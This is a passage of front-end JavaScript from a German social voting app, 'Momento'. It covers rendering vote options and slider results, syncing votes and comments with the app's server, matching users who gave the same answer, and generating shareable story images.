      <div class="relative pt-3 pb-3">
        <div class="relative flex gap-[1.5px] h-5 rounded-full overflow-hidden border border-retro-border cursor-pointer select-none transition-transform active:scale-[0.99]" onclick="handleScaleBarClick(event)">
          ${buildScaleSegments()}
        </div>
      </div>
      
      <div class="text-center text-xs font-black text-retro-muted uppercase tracking-widest animate-pulse mt-0.5">
        👆 Tippe zum Abstimmen
      </div>
    </div>
  `;
}

function renderDualBarResult({
  leftLabel, rightLabel, commPct, userPct, userValueText, commValueText,
  // Neu (für Fremdeinschätzung anpassbar, Standardwerte = bisheriges Verhalten):
  userRowLabel = "Dein Vibe:",
  commRowLabel = "Community Schnitt:",
  showCommMarker = true
}) {
  const clampedUserPct = Math.max(2, Math.min(98, userPct));
  const clampedCommPct = Math.max(2, Math.min(98, commPct));

  return `
    <div class="space-y-3 py-1 animate-fade-in text-retro-text w-full">

      <!-- 1) ANTWORTMOEGLICHKEITEN (Pol-Labels, direkt unter dem Bild) -->
      <div class="grid grid-cols-2 gap-3 text-sm sm:text-base font-black uppercase tracking-tight text-retro-text">
        <span class="text-left leading-snug break-words">${leftLabel}</span>
        <span class="text-right leading-snug break-words">${rightLabel}</span>
      </div>

      <!-- 2) EIGENER WERT (Dein Vibe / Deine Einschätzung) -->
      <div class="bg-retro-subtle border border-retro-border/60 rounded-xl px-3 py-2.5 text-center">
        <p class="text-xs sm:text-sm font-bold leading-snug break-words">
          <span class="text-retro-text/70 uppercase tracking-wide">${userRowLabel}</span>
          <span class="text-[#ff3399] font-black drop-shadow-[0_0_8px_rgba(255,51,153,0.35)]">${userValueText}</span>
        </p>
      </div>

      <!-- 3) SKALEN-LEISTE (7 Segmente, mit beiden Pfeil-Markern) -->
      <div class="relative pt-3 pb-3">
        <!-- OBERER PFEIL (Eigenes Voting) -->
        <div class="absolute top-0 marker-pop-down" style="left: ${clampedUserPct}%; transform: translateX(-50%); pointer-events: none;">
          <span class="block w-0 h-0 mx-auto border-l-[6px] border-l-transparent border-r-[6px] border-r-transparent border-t-[8px] border-t-[#ff3399] drop-shadow-[0_0_6px_rgba(255,51,153,0.8)]"></span>
        </div>

        <div class="relative flex gap-[1.5px] h-5 rounded-full overflow-hidden border border-retro-border cursor-pointer select-none" onclick="handleScaleBarClick(event)">
          ${buildScaleSegments()}
        </div>

        <!-- UNTERER PFEIL (Community Schnitt bzw. echter Wert des Erstellers) -->
        ${showCommMarker ? `
        <div class="absolute bottom-0 marker-pop-up" style="left: ${clampedCommPct}%; transform: translateX(-50%); pointer-events: none;">
          <span class="block w-0 h-0 mx-auto border-l-[6px] border-l-transparent border-r-[6px] border-r-transparent border-b-[8px] border-b-[#00e5ff] drop-shadow-[0_0_6px_rgba(0,229,255,0.8)]"></span>
        </div>` : ''}
      </div>

      <!-- 4) VERGLEICHSWERT (Community Schnitt / echte Antwort des Erstellers) -->
      <div class="bg-retro-subtle border border-retro-border/60 rounded-xl px-3 py-2.5 text-center">
        <p class="text-xs sm:text-sm font-bold leading-snug break-words">
          <span class="text-retro-text/70 uppercase tracking-wide">${commRowLabel}</span>
          <span class="text-[#00e5ff] font-black drop-shadow-[0_0_8px_rgba(0,229,255,0.35)]">${commValueText}</span>
        </p>
      </div>
    </div>
  `;
}

function renderOptions(topic, version, votedOption) {
  const optionsContainer = document.getElementById('quiz-options');
  if (!optionsContainer) return;
  optionsContainer.innerHTML = '';

  const hasVoted = !!votedOption;
  const type = version.type || "choice";

  optionsContainer.className = "grid gap-2 text-center";

  if (type === "choice") {
    optionsContainer.classList.add("grid-cols-1", "gap-2.5", "text-center");

    const estimateActive = isEstimateActiveFor(topic, version);

    version.options.forEach(opt => {
      const btn = document.createElement('button');
      const isThisVoted = votedOption === opt.name;
      // Nach der Auflösung: markiert die Option, die der Ersteller wirklich gewählt hat.
      const isCreatorPick = estimateActive && estimateRevealed &&
        estimateContext && String(estimateContext.creatorVal) === opt.name;

      // Untereinander statt nebeneinander: volle Kartenbreite pro Option.
      // Der Name steht mittig im Button, die Prozentzahl ist unabhängig davon
      // fest am rechten Rand positioniert (absolute), damit die Zentrierung
      // des Namens nicht durch die Prozentzahl verschoben wird.
      let btnClasses = "w-full py-3 px-4 rounded-xl text-sm sm:text-base transition-all duration-200 flex items-center justify-center border leading-snug select-none relative ";

      if (!hasVoted) {
        btnClasses += "border-retro-border bg-retro-subtle text-retro-text hover:border-retro-accent hover:bg-retro-card active:scale-[0.98]";
      } else if (isThisVoted) {
        btnClasses += "border-retro-accent bg-retro-accent text-white font-bold shadow-md ring-2 ring-retro-accent/40 scale-[1.01] z-10";
      } else {
        btnClasses += "border-retro-border/40 bg-retro-subtle/40 text-retro-muted opacity-60 hover:opacity-100 hover:border-retro-accent/50";
      }

      if (isCreatorPick) {
        btnClasses += " ring-2 ring-[#00e5ff] ring-offset-1 ring-offset-retro-card";
      }

      btn.className = btnClasses;
      btn.onclick = (e) => {
        e.stopPropagation(); 
        vote(opt.name);
      };

      const percentColor = isThisVoted ? "text-white font-black" : "text-retro-accent font-black";
      const percentVisibility = hasVoted && !estimateActive ? "opacity-100" : "opacity-0 pointer-events-none";
      const creatorBadge = isCreatorPick
        ? `<span class="absolute -top-2 -right-2 text-[9px] leading-none bg-[#00e5ff] text-slate-950 font-black px-1.5 py-1 rounded-full shadow whitespace-nowrap">🎯 ${escapeHtml(estimateContext.creatorName)}</span>`
        : '';

      btn.innerHTML = `
        ${creatorBadge}
        <span class="break-words font-bold text-center px-10">${escapeHtml(opt.name)}</span>
        <span class="absolute right-4 top-1/2 -translate-y-1/2 text-sm sm:text-base transition-opacity duration-200 ${percentColor} ${percentVisibility}">${getLiveChoicePercent(topic, version, opt.name, opt.percent)}</span>
      `;

      optionsContainer.appendChild(btn);
    });

  } else if (type === "versus") {
    optionsContainer.classList.add("grid-cols-1", "text-left");

    // Einmal hier escapen (statt an jeder einzelnen Verwendungsstelle unten)
    // -> leftLabel/rightLabel sind bei Custom-Topics frei getippter
    // Nutzertext und landen gleich mehrfach in innerHTML-Strings.
    const leftLabel = escapeHtml(version.leftLabel || "Links");
    const rightLabel = escapeHtml(version.rightLabel || "Rechts");
    const fallbackAvg = version.stats?.communityAverage !== undefined ? version.stats.communityAverage : 50;
    const commAvg = getLiveVersusAverage(topic, version, fallbackAvg);
    const estimateActive = isEstimateActiveFor(topic, version);

    if (!hasVoted) {
      optionsContainer.innerHTML = renderUnvotedScale(leftLabel, rightLabel);
    } else {
      const userVote = parseInt(votedOption);

      if (estimateActive) {
        const creatorName = escapeHtml(estimateContext.creatorName);
        if (estimateRevealed) {
          // Aufgelöst: zeige echten Wert des Erstellers statt Community-Schnitt.
          const creatorVal = parseInt(estimateContext.creatorVal);
          optionsContainer.innerHTML = renderDualBarResult({
            leftLabel, rightLabel,
            commPct: creatorVal,
            userPct: userVote,
            userValueText: formatVersusValue(userVote, leftLabel, rightLabel),
            commValueText: formatVersusValue(creatorVal, leftLabel, rightLabel),
            userRowLabel: `Deine Einschätzung von @${creatorName}:`,
            commRowLabel: `@${creatorName}s echte Antwort:`,
            showCommMarker: true
          });
        } else {
          // Noch nicht aufgelöst: echter Wert bleibt verdeckt.
          optionsContainer.innerHTML = renderDualBarResult({
            leftLabel, rightLabel,
            commPct: 50,
            userPct: userVote,
            userValueText: formatVersusValue(userVote, leftLabel, rightLabel),
            commValueText: "🔒 Noch verdeckt",
            userRowLabel: `Deine Einschätzung von @${creatorName}:`,
            commRowLabel: `@${creatorName}s echte Antwort:`,
            showCommMarker: false
          });
        }
      } else {
        optionsContainer.innerHTML = renderDualBarResult({
          leftLabel, rightLabel,
          commPct: commAvg,
          userPct: userVote,
          userValueText: formatVersusValue(userVote, leftLabel, rightLabel),
          commValueText: formatVersusValue(Math.round(commAvg), leftLabel, rightLabel)
        });
      }
    }
  }

  safeCreateIcons();
}

window.handleScaleBarClick = function(event) {
  const rect = event.currentTarget.getBoundingClientRect();
  const clickX = event.clientX - rect.left;
  const width = rect.width;
  let pct = clickX / width;
  if (pct < 0) pct = 0;
  if (pct > 1) pct = 1;

  // 7 gleich breite Felder (Index 0 bis 6)
  // Mitte des mittleren Feldes (Index 3) liegt exakt bei 50%
  const totalSegments = 7;
  const segmentIndex = Math.min(totalSegments - 1, Math.floor(pct * totalSegments));
  const value = Math.round((segmentIndex + 0.5) * 100 / totalSegments);

  vote(value);
};

async function vote(option) {
  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return;
  const version = topic.versions[currentVersionIndex];
  const voteKey = `kiosk_vote_${topic.id}_${version.id}`;
  
  const previousVote = localStorage.getItem(voteKey);

  // Bei erneutem Klick auf dieselbe Option -> Unvote
  if (previousVote !== null && String(previousVote) === String(option)) {
    hapticFeedback(10);
    localStorage.removeItem(voteKey);
    selectedChoice = "";
    estimateRevealed = false;

    const postVoteActions = document.getElementById('post-vote-actions');
    if (postVoteActions) postVoteActions.classList.add('hidden');

    const matchSurprise = document.getElementById('match-surprise');
    if (matchSurprise) matchSurprise.classList.add('hidden');

    const estimateReveal = document.getElementById('estimate-reveal');
    if (estimateReveal) estimateReveal.classList.add('hidden');

    renderOptions(topic, version, null);
    trackEvent("unvote", { topic: topic.title, version: version.id });
    // Hinweis: Beim Server bleibt die alte Stimme vorerst stehen. Ein Unvote
    // wird in der Praxis fast immer sofort von einer neuen Wahl gefolgt
    // (die den Server-Wert dann automatisch überschreibt) – ein echtes
    // Löschen beim Server ist für den Anwendungsfall hier nicht nötig.
    return;
  }

  hapticFeedback(12);
  selectedChoice = option;
  localStorage.setItem(voteKey, option);
  // Neue eigene Wahl -> eine eventuell vorherige Auflösung ist nicht mehr gültig.
  estimateRevealed = false;

  const postVoteActions = document.getElementById('post-vote-actions');
  if (postVoteActions) postVoteActions.classList.remove('hidden');

  const matchSurprise = document.getElementById('match-surprise');
  if (matchSurprise) matchSurprise.classList.add('hidden');

  const estimateReveal = document.getElementById('estimate-reveal');
  if (estimateReveal) estimateReveal.classList.add('hidden');
  
  const revealBtn = document.getElementById('btn-reveal-match');
  if (revealBtn) revealBtn.classList.remove('hidden');
  updateRevealButtonText(topic, version);

  renderOptions(topic, version, option);
  trackEvent("vote", { topic: topic.title, version: version.id, option });

  // Stimme an den Server melden. Läuft im Hintergrund: Klappt es nicht
  // (kein Internet, Server schläft gerade), bleibt die App trotzdem
  // benutzbar, weil die Stimme schon lokal gespeichert ist.
  try {
    const result = await submitVote(topic.id, version.id, option);
    liveStatsCache[statsCacheKey(topic.id, version.id)] = result.stats;

    const stillOnSameCard = filteredTopics[currentTopicIndex] && filteredTopics[currentTopicIndex].id === topic.id &&
      filteredTopics[currentTopicIndex].versions[currentVersionIndex] &&
      filteredTopics[currentTopicIndex].versions[currentVersionIndex].id === version.id;

    if (stillOnSameCard) {
      renderOptions(topic, version, option);
    }
    pollInbox(); // Guter Moment für einen Check: vielleicht liegt gerade eine neue Antwort vor.
  } catch (err) {
    console.warn('Stimme konnte nicht an den Server gemeldet werden:', err.message);
  }
}


async function revealMatch() {
  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return;
  const version = topic.versions[currentVersionIndex];
  const revealBtn = document.getElementById('btn-reveal-match');

  if (isEstimateActiveFor(topic, version)) {
    // Button sofort verstecken (verhindert Doppel-Klicks), auch wenn die
    // Server-Antwort noch aussteht. Bei einem Fehler blendet
    // setupEstimateReveal ihn notfalls wieder ein.
    if (revealBtn) revealBtn.classList.add('hidden');
    await setupEstimateReveal(topic, version);
    trackEvent("reveal_estimate", { topic: topic.title, version: version.id });
    return;
  }

  // Button sofort verstecken (verhindert Doppel-Klicks), auch wenn die
  // Server-Antwort noch aussteht.
  if (revealBtn) revealBtn.classList.add('hidden');
  await setupMatchSurprise(topic, version);

  const matchSurprise = document.getElementById('match-surprise');
  if (matchSurprise) matchSurprise.classList.remove('hidden');
  
  trackEvent("reveal_match", { topic: topic.title, version: version.id });
}

// Baut die Auflösung für die Fremdeinschätzung. Bei neuen, über den Server
// laufenden Links (resolvedFromServer) wird der eigene Tipp jetzt erst zum
// Server geschickt – der Server schickt daraufhin beide Werte zurück (Tipp +
// echte Antwort). Bei alten Links ohne Backend war der echte Wert schon
// vorher (aus der URL) bekannt.
async function setupEstimateReveal(topic, version) {
  const guess = selectedChoice || localStorage.getItem(`kiosk_vote_${topic.id}_${version.id}`);
  if (!guess || !estimateContext) return;

  let creatorVal = estimateContext.creatorVal;

  if (estimateContext.resolvedFromServer && estimateContext.shareId) {
    try {
      const result = await respondToEstimate(estimateContext.shareId, guess);
      creatorVal = result.creatorVal;
      estimateContext.creatorVal = creatorVal; // für spätere Re-Renders merken
    } catch (err) {
      alert(`Die Auflösung konnte nicht geladen werden: ${err.message}`);
      // Button wieder einblenden, da nichts aufgelöst wurde -> nochmal versuchbar.
      const revealBtn = document.getElementById('btn-reveal-match');
      if (revealBtn) revealBtn.classList.remove('hidden');
      return;
    }
  }

  estimateRevealed = true;
  // Skala/Auswahl-Buttons mit dem jetzt aufgelösten echten Wert neu zeichnen.
  renderOptions(topic, version, guess);

  const matchSurprise = document.getElementById('match-surprise');
  if (matchSurprise) matchSurprise.classList.add('hidden');

  const reveal = document.getElementById('estimate-reveal');
  if (!reveal) return;

  const titleEl = document.getElementById('estimate-reveal-title');
  const gapEl = document.getElementById('estimate-reveal-gap-text');
  const creatorName = estimateContext.creatorName;

  if (titleEl) titleEl.innerText = `🎯 So gut kennst du @${creatorName}!`;

  if (version.type === 'versus') {
    const creatorValNum = parseInt(creatorVal);
    const guessVal = parseInt(guess);
    const diff = guessVal - creatorValNum;
    const absDiff = Math.abs(diff);

    let gapText;
    if (absDiff <= 5) {
      gapText = `🎯 Volltreffer! Du kennst @${creatorName} richtig gut.`;
    } else {
      const richtung = diff > 0 ? (version.rightLabel || "Rechts") : (version.leftLabel || "Links");
      gapText = `Du siehst @${creatorName} ${absDiff} Punkte mehr Richtung "${richtung}", als ${creatorName} sich selbst einschätzt.`;
    }
    if (gapEl) gapEl.innerText = gapText;
  } else {
    if (gapEl) {
      gapEl.innerText = (String(guess) === String(creatorVal))
        ? `🎯 Volltreffer! @${creatorName} hat wirklich "${creatorVal}" gewählt.`
        : `Knapp daneben: @${creatorName} hat tatsächlich "${creatorVal}" gewählt.`;
    }
  }

  reveal.classList.remove('hidden');
}

// Hält den zuletzt vom Server gefundenen ECHTEN Match-Partner fest (gesetzt
// von setupMatchSurprise, gelesen von sendVibeRequest beim Klick auf "Vibe
// anfragen"). null, solange kein Match gefunden wurde oder noch gesucht wird.
let currentMatch = null;

async function setupMatchSurprise(topic, version) {
  const btn = document.querySelector('#match-surprise button');
  const avatar = document.getElementById('match-avatar');
  const badgeHeader = document.getElementById('match-badge-title');
  const subtitleText = document.getElementById('match-subtitle-text');

  const userChoice = selectedChoice || localStorage.getItem(`kiosk_vote_${topic.id}_${version.id}`);
  if (!userChoice) return;

  currentMatch = null; // zurücksetzen, bis eine echte Antwort vom Server da ist

  // Lade-Zustand: kurz sichtbar, während die Anfrage läuft (echtes
  // Matching braucht - anders als die frühere Zufallssimulation - einen
  // Server-Request und damit etwas Zeit).
  if (badgeHeader) badgeHeader.innerHTML = "Momento-Match! ⚡";
  if (subtitleText) subtitleText.innerText = "Suche nach einem Match läuft …";
  if (avatar) avatar.innerText = "…";
  if (btn) {
    btn.className = "flex-shrink-0 px-2.5 py-1.5 bg-retro-secondary/10 text-retro-secondary/50 border border-retro-secondary/20 rounded-xl text-xs font-bold flex items-center gap-1 opacity-60 pointer-events-none";
    btn.innerHTML = `<i data-lucide="sparkles" class="w-4 h-4 animate-pulse"></i> <span>Suche...</span>`;
  }
  safeCreateIcons();

  let result;
  try {
    result = await fetchRealMatch(topic.id, version.id);
  } catch (err) {
    console.warn('Momento-Match konnte nicht geladen werden:', err.message);
    if (subtitleText) subtitleText.innerText = "Match konnte gerade nicht geladen werden. Versuch's gleich nochmal.";
    if (btn) btn.classList.add('hidden');
    return;
  }

  if (!result.matched) {
    // Ehrlicher Fallback statt eines erfundenen Namens: bislang hat
    // niemand sonst für diese Karte dieselbe Antwort gegeben.
    if (avatar) avatar.innerText = "✨";
    if (subtitleText) subtitleText.innerText = "Noch niemand hat wie du abgestimmt – sei gespannt, wer als Nächstes nachzieht!";
    if (btn) btn.classList.add('hidden'); // kein Ziel, an das man eine Anfrage schicken könnte
    return;
  }

  // ECHTER Match-Partner gefunden -> für den späteren Klick auf "Vibe
  // anfragen" merken.
  currentMatch = {
    topicId: topic.id,
    versionId: version.id,
    deviceId: result.matchDeviceId,
    nickname: result.matchNickname
  };

  const initials = result.matchNickname.substring(0, 2).toUpperCase();
  if (avatar) avatar.innerText = initials;

  if (topic.category === 'damals') {
    if (subtitleText) subtitleText.innerText = `Du schwelgst in derselben Erinnerung wie @${result.matchNickname} (Team ${userChoice})!`;
  } else if (version.type === "versus") {
    if (subtitleText) subtitleText.innerText = `Du und @${result.matchNickname} habt dieselbe Tendenz!`;
  } else {
    if (subtitleText) subtitleText.innerText = `Du hast denselben Vibe wie @${result.matchNickname} (Team ${userChoice})!`;
  }

  if (btn) {
    btn.classList.remove('hidden');
    btn.className = "flex-shrink-0 px-2.5 py-1.5 bg-retro-secondary/10 hover:bg-retro-secondary/20 text-retro-secondary border border-retro-secondary/30 rounded-xl text-xs font-bold transition-all flex items-center gap-1";
    btn.innerHTML = `<i data-lucide="message-square-plus" class="w-4 h-4"></i> <span>Vibe anfragen</span>`;
  }
  safeCreateIcons();
}

// Schritt B: Sendet die Vibe-Anfrage an den ECHTEN, zuvor gefundenen
// Match-Partner (currentMatch). Der Server prüft serverseitig nochmal nach,
// dass beide wirklich dieselbe Option gewählt haben (siehe server.js),
// legt die Anfrage in vibe_requests an und triggert damit die bestehende
// Postfach-Benachrichtigung (Glocke) beim Empfänger/bei der Empfängerin.
async function sendVibeRequest() {
  if (!currentMatch) return;
  const btn = document.querySelector('#match-surprise button');

  if (btn) {
    btn.className = "flex-shrink-0 px-2.5 py-1.5 bg-retro-subtle text-retro-muted border border-retro-border rounded-xl text-xs font-bold flex items-center gap-1 opacity-70 pointer-events-none";
    btn.innerHTML = `<i data-lucide="sparkles" class="w-4 h-4 animate-pulse"></i> <span>Sende...</span>`;
    safeCreateIcons();
  }

  try {
    await sendVibeRequestToServer(currentMatch.topicId, currentMatch.versionId, currentMatch.deviceId);
    // Kleines "Erfolgs"-Muster (tick-Pause-tick), fühlt sich wie eine
    // Bestätigung an statt nur wie ein einzelner flacher Tap.
    hapticFeedback([10, 40, 12]);
    if (btn) {
      btn.className = "flex-shrink-0 px-2.5 py-1.5 bg-emerald-500/10 text-emerald-500 border border-emerald-500/30 rounded-xl text-xs font-bold transition-all flex items-center gap-1 pointer-events-none animate-fade-in";
      btn.innerHTML = `<i data-lucide="check" class="w-4 h-4"></i> <span>Gesendet!</span>`;
      safeCreateIcons();
    }
    trackEvent("send_vibe_request");
  } catch (err) {
    if (btn) {
      btn.className = "flex-shrink-0 px-2.5 py-1.5 bg-retro-secondary/10 hover:bg-retro-secondary/20 text-retro-secondary border border-retro-secondary/30 rounded-xl text-xs font-bold transition-all flex items-center gap-1";
      btn.innerHTML = `<i data-lucide="message-square-plus" class="w-4 h-4"></i> <span>Vibe anfragen</span>`;
      safeCreateIcons();
    }
    alert(`Vibe-Anfrage konnte nicht gesendet werden: ${err.message}`);
  }
}

// Aktualisiert den "💬 X Gedanken lesen"-Button im Footer. Nimmt bewusst nur
// eine Zahl entgegen (statt eines ganzen topic-Objekts) - so kann die
// Funktion unverändert sowohl für die eingebauten Beispiel-Kommentare als
// auch für die live vom Server geladenen Kommentare verwendet werden.
function updateCommentsButton(count) {
  const commentsBtnText = document.getElementById('comments-btn-text');
  if (commentsBtnText) {
    commentsBtnText.innerText = count === 1 
      ? `💬 1 Gedanke lesen` 
      : `💬 ${count} Gedanken lesen`;
  }
}

// Lädt die Kommentare zu einem Thema. Zeigt SOFORT die eingebauten
// Beispiel-Kommentare (topic.memories) an, damit die Liste nie leer wirkt,
// während im Hintergrund die ECHTEN, von anderen Nutzern gespeicherten
// Kommentare vom Server nachgeladen werden. Schlägt das fehl (kein Internet,
// Server schläft gerade, ...), bleiben einfach die Beispiel-Kommentare
// stehen - "Fallback auf die Initial-Daten" wie gewünscht.
async function loadCommentsForTopic(topic) {
  const fallbackMemories = topic.memories || [];
  renderMemories(fallbackMemories);
  updateCommentsButton(fallbackMemories.length);

  try {
    const serverComments = await fetchCommentsFromServer(topic.id);

    // Nur noch anzeigen, wenn der Nutzer währenddessen nicht schon
    // weitergewischt hat (sonst würden wir eine längst verlassene Karte
    // im Hintergrund überschreiben).
    const stillOnSameCard = filteredTopics[currentTopicIndex] && filteredTopics[currentTopicIndex].id === topic.id;
    if (!stillOnSameCard) return;

    renderMemories(serverComments);
    updateCommentsButton(serverComments.length);
  } catch (err) {
    console.warn(`Kommentare für "${topic.title}" konnten nicht vom Server geladen werden, zeige Beispiel-Kommentare:`, err.message);
  }
}

function renderMemories(memories) {
  const list = document.getElementById('memory-list');
  if (!list) return;
  list.innerHTML = '';
  
  if (!memories.length) {
    list.innerHTML = `<p class="text-sm text-retro-muted italic text-center py-6">Noch keine Gedanken hinterlassen. Sei der Erste!</p>`;
    return;
  }
  
  memories.forEach(m => {
    const item = document.createElement('div');
    item.className = "bg-retro-subtle p-3.5 rounded-2xl border border-retro-border text-xs space-y-1 text-retro-text animate-fade-in";
    item.innerHTML = `
      <div class="flex justify-between items-center text-xs text-retro-muted">
        <span class="font-bold ${m.color || 'text-retro-accent'}">@${escapeHtml(m.user)}</span>
        <span>${escapeHtml(m.time)}</span>
      </div>
      <p class="text-retro-text">„${escapeHtml(m.text)}“</p>
    `;
    list.appendChild(item);
  });
}

async function addMemory() {
  const input = document.getElementById('memory-input');
  if (!input || !input.value.trim()) return;

  const topic = filteredTopics[currentTopicIndex];
  if (!topic) return;
  const version = topic.versions[currentVersionIndex];

  // BUGFIX: Vorher wurde hier ein Element mit der ID "nickname-input"
  // gesucht - das existiert in diesem Formular gar nicht (nur
  // "share-nickname-input" in einem ANDEREN Modal). Dadurch war
  // nicknameInput immer null und JEDER Kommentar wurde als "Anonymus"
  // gespeichert, egal was der Nutzer eigentlich als Namen hinterlegt hatte.
  // getStoredNickname() ist die zentrale, an anderer Stelle bereits
  // korrekt gepflegte Quelle für den Spitznamen.
  const userNickname = getStoredNickname();
  const commentText = input.value.trim();
  input.value = ''; // Sofort leeren -> fühlt sich direkt reaktionsschnell an.

  // Optimistisches Update: Kommentar SOFORT lokal anzeigen, ohne auf die
  // Server-Antwort zu warten (fühlt sich unmittelbar an). Falls das
  // Speichern auf dem Server fehlschlägt, bleibt der Kommentar für diese
  // Sitzung trotzdem sichtbar - er geht nur nicht dauerhaft in die
  // Datenbank ein.
  if (!topic.memories) topic.memories = [];
  topic.memories.unshift({
    user: userNickname,
    time: "Gerade eben",
    text: commentText,
    color: "text-retro-accent"
  });
  renderMemories(topic.memories);
  updateCommentsButton(topic.memories.length);
  trackEvent("add_memory", { topic: topic.title, version: version.id });

  try {
    await postCommentToServer(topic.id, userNickname, commentText);
  } catch (err) {
    console.warn('Kommentar konnte nicht auf dem Server gespeichert werden (bleibt aber für diese Sitzung sichtbar):', err.message);
  }
}

const storyThemes = [
  { name: "Retro-Nacht", classes: "from-slate-900 via-purple-950 to-pink-950" },
  { name: "Freibad-Chlor", classes: "from-cyan-950 via-teal-950 to-emerald-950" },
  { name: "Kiosk-Sonne", classes: "from-amber-950 via-red-950 to-orange-950" }
];
let currentStoryThemeIndex = 0;

function cycleStoryTheme() {
  const target = document.getElementById('story-canvas-target');
  if (!target) return;
  storyThemes[currentStoryThemeIndex].classes.split(' ').forEach(c => target.classList.remove(c));
  currentStoryThemeIndex = (currentStoryThemeIndex + 1) % storyThemes.length;
  storyThemes[currentStoryThemeIndex].classes.split(' ').forEach(c => target.classList.add(c));
}

async function shareToStory() {
  const activeTopic = filteredTopics[currentTopicIndex];
  const title = document.getElementById('card-title')?.textContent || 'Momento Vibe';
  const sticker = document.getElementById('card-vibe-sticker')?.textContent || '🍟';
  const nickname = getStoredNickname();

  const canvas = document.createElement('canvas');
  canvas.width = 1080;
  canvas.height = 1920;
  const ctx = canvas.getContext('2d');

  const gradient = ctx.createLinearGradient(0, 0, 0, 1920);
  gradient.addColorStop(0, '#0f172a');
  gradient.addColorStop(0.5, '#581c87');
  gradient.addColorStop(1, '#831843');
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, 1080, 1920);

  ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
  ctx.lineWidth = 2;
  for (let x = 0; x < 1080; x += 60) {
    ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, 1920); ctx.stroke();
  }

  ctx.fillStyle = '#f59e0b';
  ctx.font = 'black 32px sans-serif';
  ctx.textAlign = 'center';
  ctx.fillText('MOMENTO • DIE GEMISCHTE TÜTE DES LEBENS', 540, 160);

  ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
  ctx.font = 'bold 38px sans-serif';
  ctx.fillText(`Vibe-Check von @${nickname}`, 540, 230);

  ctx.fillStyle = '#ffffff';
  ctx.font = 'black 85px sans-serif';
  ctx.fillText(title, 540, 480, 960);

  ctx.font = '220px sans-serif';
  ctx.fillText(sticker, 540, 750);

  const boxX = 140;
  const boxY = 920;
  const boxW = 800;
  const boxH = 420;

  ctx.fillStyle = 'rgba(15, 23, 42, 0.75)';
  ctx.beginPath();
  ctx.roundRect(boxX, boxY, boxW, boxH, 40);
  ctx.fill();

  ctx.setLineDash([25, 15]);
  ctx.strokeStyle = '#ec4899';
  ctx.lineWidth = 8;
  ctx.stroke();
  ctx.setLineDash([]);

  ctx.fillStyle = '#cbd5e1';
  ctx.font = 'bold 36px sans-serif';
  ctx.fillText('👉 HIER STICKER / UMFRAGE PLATZIEREN 👈', 540, boxY + 220);

  ctx.fillStyle = '#ffffff';
  ctx.font = 'black 42px sans-serif';
  ctx.fillText('Mach mit auf momento.app', 540, 1720);

  canvas.toBlob(async (blob) => {
    if (!blob) return;
    const file = new File([blob], `momento-vibe-${Date.now()}.png`, { type: 'image/png' });

    if (navigator.canShare && navigator.canShare({ files: [file] })) {
      try {
        await navigator.share({
          files: [file],
          title: `Momento Challenge: ${title}`,
          text: `Mach den Vibe-Check zu "${title}"!`
        });
      } catch (err) {
        if (err.name !== 'AbortError') {
          downloadFallback(canvas);
        }
      }
    } else {
      downloadFallback(canvas);
    }
  }, 'image/png');
}

function downloadFallback(canvas) {
  const link = document.createElement('a');
  link.download = `momento-story-${Date.now()}.png`;
  link.href = canvas.toDataURL('image/png');
  link.click();
}

function closeStoryPreview() {
  const storyModal = document.getElementById('story-modal');
  if (storyModal) storyModal.classList.add('hidden');
}

function closeModal(id) {
  const el = document.getElementById(id);
  if (el) el.classList.add('hidden');
}

function clearSearch() {
  const input = document.getElementById('search-input');
  if (input) input.value = '';
}

function getStoredNickname() {
  return localStorage.getItem('kiosk_nickname') || 'KioskFan';
}

function updateHeaderNickname() {
  const display = document.getElementById('header-nickname-display');
  if (display) {
    display.textContent = `@${getStoredNickname()}`;
  }
}

function openShareModal() {
  const modal = document.getElementById('share-modal');
  if (!modal) return;

  renderShareNicknameBadge();

  // Modal startet bei jedem Öffnen im Standard-Modus (Match).
  setShareMode('match');
  modal.classList.remove('hidden');
}

// ------------------------------------------
// NICKNAME-BADGE IM SHARE-MODAL
// ------------------------------------------
// Zeigt den aktuellen Namen als kompakte, nicht-editierbare Zeile an
// ("Teilen als: @Name ✏️"). Das ist der Normalfall: der Name ist schon im
// localStorage gespeichert (kiosk_nickname), meistens muss hier niemand
// mehr etwas eingeben - anders als früher, wo ein leeres Eingabefeld zum
// Tippen "eingeladen" hat, obwohl das oft gar nicht nötig war.
function renderShareNicknameBadge() {
  const row = document.getElementById('share-nickname-row');
  if (!row) return;

  const nickname = getStoredNickname();
  row.innerHTML = `
    <span class="text-xs text-retro-muted">
      Teilen als: <strong class="text-retro-text font-black">@${escapeHtml(nickname)}</strong>
    </span>
    <button type="button" onclick="startEditShareNickname()" aria-label="Namen ändern" class="p-1.5 text-retro-muted hover:text-retro-accent transition-colors shrink-0">
      <i data-lucide="pencil" class="w-3.5 h-3.5" aria-hidden="true"></i>
    </button>
  `;
  safeCreateIcons();
}

// Klick auf das Stift-Icon: verwandelt die Badge-Zeile kurzzeitig in ein
// kleines Eingabefeld (statt eines dauerhaft sichtbaren Feldes oder eines
// blockierenden Browser-prompt()-Dialogs - fühlt sich direkter an).
function startEditShareNickname() {
  const row = document.getElementById('share-nickname-row');
  if (!row) return;

  const current = getStoredNickname();
  // Zeigt das Feld leer statt mit dem technischen Default-Wert "KioskFan",
  // damit der Platzhaltertext ("KioskFan") klar als BEISPIEL erkennbar
  // bleibt und nicht wie ein bereits eingetragener echter Name aussieht.
  const displayValue = current === 'KioskFan' ? '' : current;

  row.innerHTML = `
    <span class="text-retro-muted font-bold text-xs shrink-0">@</span>
    <input type="text" id="share-nickname-edit-input" maxlength="20" value="${escapeHtml(displayValue)}" placeholder="KioskFan" class="flex-1 min-w-0 bg-retro-card border border-retro-border rounded-xl px-2 py-1.5 text-xs text-retro-text focus:outline-none focus:border-retro-accent font-bold" />
    <button type="button" onclick="confirmEditShareNickname()" aria-label="Namen speichern" class="p-1.5 text-retro-accent hover:opacity-80 shrink-0">
      <i data-lucide="check" class="w-4 h-4" aria-hidden="true"></i>
    </button>
  `;
  safeCreateIcons();

  const input = document.getElementById('share-nickname-edit-input');
  if (input) {
    input.focus();
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') confirmEditShareNickname();
    });
  }
}

// Übernimmt den eingegebenen Namen, speichert ihn (wie bisher in
